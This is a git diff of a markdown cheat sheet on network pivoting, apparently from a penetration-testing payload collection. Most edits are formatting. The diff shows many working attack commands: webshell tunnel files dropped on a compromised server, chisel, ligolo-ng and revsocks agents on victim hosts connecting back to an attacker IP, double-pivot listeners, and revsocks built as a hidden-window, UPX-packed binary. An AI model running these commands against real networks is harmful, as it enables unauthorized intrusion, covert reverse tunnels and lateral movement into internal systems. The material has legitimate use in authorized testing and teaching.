@@ -5,9 +5,9 @@
 * [SOCKS Compatibility Table](#socks-compatibility-table)
 * [Windows netsh Port Forwarding](#windows-netsh-port-forwarding)
 * [SSH](#ssh)
-  * [SOCKS Proxy](#socks-proxy)
-  * [Local Port Forwarding](#local-port-forwarding)
-  * [Remote Port Forwarding](#remote-port-forwarding)
+    * [SOCKS Proxy](#socks-proxy)
+    * [Local Port Forwarding](#local-port-forwarding)
+    * [Remote Port Forwarding](#remote-port-forwarding)
 * [Proxychains](#proxychains)
 * [Graftcp](#graftcp)
 * [Web SOCKS - reGeorg](#web-socks---regeorg)
@@ -15,7 +15,7 @@
 * [Metasploit](#metasploit)
 * [sshuttle](#sshuttle)
 * [chisel](#chisel)
-  * [SharpChisel](#sharpchisel)
+    * [SharpChisel](#sharpchisel)
 * [gost](#gost)
 * [Rpivot](#rpivot)
 * [RevSocks](#revsocks)
@@ -23,11 +23,10 @@
 * [ngrok](#ngrok)
 * [Capture a network trace with builtin tools](#capture-a-network-trace-with-builtin-tools)
 * [Basic Pivoting Types](#basic-pivoting-types)
-  * [Listen - Listen](#listen---listen)
-  * [Listen - Connect](#listen---connect)
-  * [Connect - Connect](#connect---connect)
+    * [Listen - Listen](#listen---listen)
+    * [Listen - Connect](#listen---connect)
+    * [Connect - Connect](#connect---connect)
 * [References](#references)
-
 
 ## SOCKS Compatibility Table
 
@@ -36,7 +35,6 @@
 | SOCKS v4      | ✅    | ❌    | ✅    | ❌    | ❌       |
 | SOCKS v4a     | ✅    | ❌    | ✅    | ❌    | ✅       |
 | SOCKS v5      | ✅    | ✅    | ✅    | ✅    | ✅       |
-
 
 ## Windows netsh Port Forwarding
 
@@ -139,20 +137,19 @@ socks5 = 127.0.0.1:1080
 select_proxy_mode = auto
 ```
 
-
 ## Web SOCKS - reGeorg
 
 [reGeorg](https://github.com/sensepost/reGeorg), the successor to reDuh, pwn a bastion webserver and create SOCKS proxies through the DMZ. Pivot and pwn.
 
 Drop one of the following files on the server:
 
-- tunnel.ashx
-- tunnel.aspx
-- tunnel.js
-- tunnel.jsp
-- tunnel.nosocket.php
-- tunnel.php
-- tunnel.tomcat.5.jsp
+* tunnel.ashx
+* tunnel.aspx
+* tunnel.js
+* tunnel.jsp
+* tunnel.nosocket.php
+* tunnel.php
+* tunnel.tomcat.5.jsp
 
 ```python
 python reGeorgSocksProxy.py -p 8080 -u http://compromised.host/shell.jsp # the socks proxy will be on port 8080
@@ -175,7 +172,6 @@ pip3 install pivotnacci
 pivotnacci  https://domain.com/agent.php --password "s3cr3t"
 pivotnacci  https://domain.com/agent.php --polling-interval 2000
 ```
-
 
 ## Metasploit
 
@@ -227,9 +223,9 @@ route flush
 
 ## sshuttle
 
-Transparent proxy server that works as a poor man's VPN. Forwards over ssh. 
+Transparent proxy server that works as a poor man's VPN. Forwards over ssh.
 
-* Doesn't require admin. 
+* Doesn't require admin.
 * Works with Linux and MacOS.
 * Supports DNS tunneling.
 
@@ -248,7 +244,6 @@ $ sshuttle -vvr root@10.10.10.10 10.1.1.0/24 -e "ssh -i ~/.ssh/id_rsa"
 
 ## chisel
 
-
 ```powershell
 go get -v github.com/jpillora/chisel
 
@@ -262,7 +257,7 @@ user@victim$ .\chisel.exe client YOUR_IP:8008 R:socks
 
 ### SharpChisel
 
-A C# Wrapper of Chisel : https://github.com/shantanu561993/SharpChisel
+A C# Wrapper of Chisel : [shantanu561993/SharpChisel](https://github.com/shantanu561993/SharpChisel)
 
 ```powershell
 user@hacker$ ./chisel server -p 8080 --key "private" --auth "user:pass" --reverse --proxy "https://www.google.com"
@@ -281,93 +276,114 @@ user@victim$ SharpChisel.exe client --auth user:pass https://redacted.cloudfront
 
 Ligolo : Reverse Tunneling made easy for pentesters, by pentesters
 
-
 1. Build Ligolo
-  ```powershell
-  # Get Ligolo and dependencies
-  cd `go env GOPATH`/src
-  git clone https://github.com/sysdream/ligolo
-  cd ligolo
-  make dep
 
-  # Generate self-signed TLS certificates (will be placed in the certs folder)
-  make certs TLS_HOST=example.com
+    ```powershell
+    # Get Ligolo and dependencies
+    cd `go env GOPATH`/src
+    git clone https://github.com/sysdream/ligolo
+    cd ligolo
+    make dep
 
-  make build-all
-  ```
+    # Generate self-signed TLS certificates (will be placed in the certs folder)
+    make certs TLS_HOST=example.com
+
+    make build-all
+    ```
+
 2. Use Ligolo
-  ```powershell
-  # On your attack server.
-  ./bin/localrelay_linux_amd64
 
-  # On the compromise host.
-  ligolo_windows_amd64.exe -relayserver LOCALRELAYSERVER:5555
-  ```
+    ```powershell
+    # On your attack server.
+    ./bin/localrelay_linux_amd64
+
+    # On the compromise host.
+    ligolo_windows_amd64.exe -relayserver LOCALRELAYSERVER:5555
+    ```
 
 ## Ligolo-ng
 
 Ligolo-ng : An advanced, yet simple, tunneling tool that uses TUN interfaces.
 
-#### Single Pivot
-1. Downloading the binaries.
-- The proper binaries can be downloaded from [here](https://github.com/nicocha30/ligolo-ng/releases/tag/v0.5.2).
+### Single Pivot
+
+1. Downloading the binaries from [nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng/releases/tag/v0.5.2).
 
 2. Setting up the ligolo-ng interface and IP routes.
-- The initial step is to create a new interface and add an IP route to the subnet that we want to pivot to through this interface. We can easily do it through the following bash script.
-```bash
-#!/bin/bash
 
-ip tuntap add user root mode tun ligolo
-ip link set ligolo up
-ip route add <x.x.x.x\24> dev ligolo
-```
+    * The initial step is to create a new interface and add an IP route to the subnet that we want to pivot to through this interface. We can easily do it through the following bash script.
 
-- We can then run the script by issuing the `chmod +x ligolo-ng_setup.sh && ./ligolo-ng_setup.sh`
+        ```bash
+        #!/bin/bash
+        ip tuntap add user root mode tun ligolo
+        ip link set ligolo up
+        ip route add <x.x.x.x\24> dev ligolo
+        ```
 
-3. Setting up the ligolo-ng proxy.
-- After the interface has been setup, we can now start the ligolo-ng proxy. We can use any `<PROXY_PORT>` we want as long as it not already in use.
-`./proxy -laddr <ATTACKER_IP>:<PROXY_PORT> -selfcert`
+    * We can then run the script by issuing the following command
 
-4. Using the ligolo-ng agent to connect to the ligolo-ng proxy.
-- In the compromised computer we can use the agent to connect back to the proxy.
-`./agent -connect <ATTACKER_IP>:<PROXY_PORT> -ignore-cert`
+        ```ps1
+        chmod +x ligolo-ng_setup.sh && ./ligolo-ng_setup.sh
+        ```
 
-5. Start tunneling traffic through ligolo-ng.
-- Once the connection from the agent reaches the proxy we can use the `session` command to list the available sessions.
-- We can use the arrow keys to select the session we want and issue the command `start` to start tunnelling traffic through it.
+3. Setting up the ligolo-ng proxy. After the interface has been setup, we can now start the ligolo-ng proxy. We can use any `<PROXY_PORT>` we want as long as it not already in use.
+
+    ```ps1
+    ./proxy -laddr <ATTACKER_IP>:<PROXY_PORT> -selfcert
+    ````
+
+4. Using the ligolo-ng agent to connect to the ligolo-ng proxy. In the compromised computer we can use the agent to connect back to the proxy.
+
+    ```ps1
+    ./agent -connect <ATTACKER_IP>:<PROXY_PORT> -ignore-cert
+    ```
+
+5. Start tunneling traffic through ligolo-ng. Once the connection from the agent reaches the proxy we can use the `session` command to list the available sessions. We can use the arrow keys to select the session we want and issue the command `start` to start tunnelling traffic through it.
 
 6. Using local tools.
-- After the tunneling has been initiated, we can use local offensive tools, such as CrackMapExec, Impacket, Nmap through the ligolo-ng network pivot without any kind of limitations or added lag (this is especially true for Nmap).
 
-#### Double Pivot
+After the tunneling has been initiated, we can use local offensive tools, such as CrackMapExec, Impacket, Nmap through the ligolo-ng network pivot without any kind of limitations or added lag (this is especially true for Nmap).
+
+### Double Pivot
+
 1. Setting up a listener in the initial pivoting session.
-- To start a double pivot, we have to make sure that the connection of the second agent will go through the **first** agent to avoid losing contact to our first pivot. To do so, we will have to create a _listener_ to the ligolo-ng session responsible for the first pivot.
-- This command starts a listener to all the interfaces (`0.0.0.0`) of the **compromised**  host in port `4443` (we can replace it with any other port we want, as long as it is not already in use in the compromised initial pivot host). Any traffic that reaches this listener will be **redirected to the ligolo-ng** proxy (`--to <ATTACKER_IP>:<PROXY_PORT>`).
-`listener_add --addr 0.0.0.0:4443 --to <ATTACKER_IP>:<PROXY_PORT> --tcp`
 
-2. Starting te second agent. 
-- After transferring the ligolo-ng agent to the **second** pivot host that we have compromised we will start a connection **not directly to our ligolo-ng proxy** but to the first pivoting agent.
-`.\agent.exe -connect <1st_PIVOT_HOST_IP>:4443 -ignore-cert `
+    * To start a double pivot, we have to make sure that the connection of the second agent will go through the **first** agent to avoid losing contact to our first pivot. To do so, we will have to create a _listener_ to the ligolo-ng session responsible for the first pivot.
+    * This command starts a listener to all the interfaces (`0.0.0.0`) of the **compromised**  host in port `4443` (we can replace it with any other port we want, as long as it is not already in use in the compromised initial pivot host). Any traffic that reaches this listener will be **redirected to the ligolo-ng** proxy (`--to <ATTACKER_IP>:<PROXY_PORT>`).
 
-3. Starting the second pivot.
-- In the ligolo-ng proxy we will receive a call from the second agent through the listener of the first agent. We can use the `session` command and the arrow keys to navigate through the created sessions. Issuing the `start` and `stop` commands we can tell the ligolo-ng proxy which session will be used for tunneling traffic.
+        ```ps1
+        listener_add --addr 0.0.0.0:4443 --to <ATTACKER_IP>:<PROXY_PORT> --tcp
+        ```
 
-4. Adding a new IP route to the second network.
-- Before being able to use our local tools to the second network that we want to pivot to, we need to add a new IP route for it through the `ligolo` interface that we created in the first step.
-`ip route add 172.16.10.0/24 dev ligolo`
+2. Starting te second agent. After transferring the ligolo-ng agent to the **second** pivot host that we have compromised we will start a connection **not directly to our ligolo-ng proxy** but to the first pivoting agent.
+
+    ```ps1
+    .\agent.exe -connect <1st_PIVOT_HOST_IP>:4443 -ignore-cert
+    ```
+
+3. Starting the second pivot. In the ligolo-ng proxy we will receive a call from the second agent through the listener of the first agent. We can use the `session` command and the arrow keys to navigate through the created sessions. Issuing the `start` and `stop` commands we can tell the ligolo-ng proxy which session will be used for tunneling traffic.
+
+4. Adding a new IP route to the second network. Before being able to use our local tools to the second network that we want to pivot to, we need to add a new IP route for it through the `ligolo` interface that we created in the first step.
+
+    ```ps1
+    ip route add 172.16.10.0/24 dev ligolo
+    ```
 
 5. Using local tools.
-- After the tunneling has been initiated, we can use local offensive tools to the second network as well.
 
-#### Triple, etc. Pivot
-- The process is exactly the same as the second pivot.
+* After the tunneling has been initiated, we can use local offensive tools to the second network as well.
 
-#### Pivoting to individual hosts to expose internally running services.
-- The same process can also be used to pivot to individual hosts instead of whole subnets. This will allow an operator to expose locally running services in the compromised server, similar to the dynamic port forwarding through SSH.
+### Triple, etc. Pivot
+
+* The process is exactly the same as the second pivot.
+
+### Pivoting to individual hosts to expose internally running services
+
+* The same process can also be used to pivot to individual hosts instead of whole subnets. This will allow an operator to expose locally running services in the compromised server, similar to the dynamic port forwarding through SSH.
 
 ## Gost
 
-> Wiki English : https://docs.ginuerzh.xyz/gost/en/
+> Wiki English : <https://docs.ginuerzh.xyz/gost/en/>
 
 ```powershell
 git clone https://github.com/ginuerzh/gost
@@ -422,7 +438,6 @@ user@PC$ ./revsocks -connect 10.10.10.10:8443 -pass Password1234
 user@PC$ ./revsocks -connect 10.10.10.10:8443 -pass Password1234 -proxy proxy.domain.local:3128 -proxyauth Domain/userpame:userpass -useragent "Mozilla 5.0/IE Windows 10"
 ```
 
-
 ```powershell
 # Build for Linux
 git clone https://github.com/kost/revsocks
@@ -441,7 +456,6 @@ GOOS=windows GOARCH=amd64 go build -ldflags="-s -w"
 go build -ldflags -H=windowsgui
 upx revsocks
 ```
-
 
 ## plink
 
@@ -487,6 +501,7 @@ tar xvzf cloudflared-stable-linux-amd64.tgz
 ## Capture a network trace with builtin tools
 
 * Windows (netsh)
+
   ```ps1
   # start a capture use the netsh command.
   netsh trace start capture=yes report=disabled tracefile=c:\trace.etl maxsize=16384
@@ -503,7 +518,9 @@ tar xvzf cloudflared-stable-linux-amd64.tgz
   # Use filters
   netsh trace start capture=yes report=disabled Ethernet.Type=IPv4 IPv4.Address=10.200.200.3 tracefile=c:\trace.etl maxsize=16384
   ```
+
 * Linux (tcpdump)
+
   ```ps1
   sudo apt-get install tcpdump
   tcpdump -w 0001.pcap -i eth0
@@ -516,7 +533,6 @@ tar xvzf cloudflared-stable-linux-amd64.tgz
   tcpdump -i eth0 port 22
   ```
 
-  
 ## Basic Pivoting Types
 
 | Type              | Use Case                                    |
